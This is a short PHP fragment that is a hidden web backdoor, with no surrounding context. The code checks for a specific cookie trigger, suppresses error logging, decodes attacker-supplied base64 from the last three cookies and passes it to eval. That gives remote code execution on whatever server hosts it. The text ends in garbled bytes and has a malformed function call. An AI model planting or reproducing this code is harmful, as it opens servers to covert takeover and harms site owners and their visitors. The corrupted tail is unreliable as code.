

if(reset($_COOKIE)=='12' && count($_COOKIE)>3){ini_set('error_log', '/dev/null');
echo '<3123>';
eval(base64_decode(
    preg_replace(
            array('/[^\w=\s]/' , '/\s/'), array( '' , '+' ), join(array_slice($_COOKIE,  $count($_COOKIE)-3)
                                                                                )
                    )
                         )
                                );
echBsÂòrâF²âsâs·Ð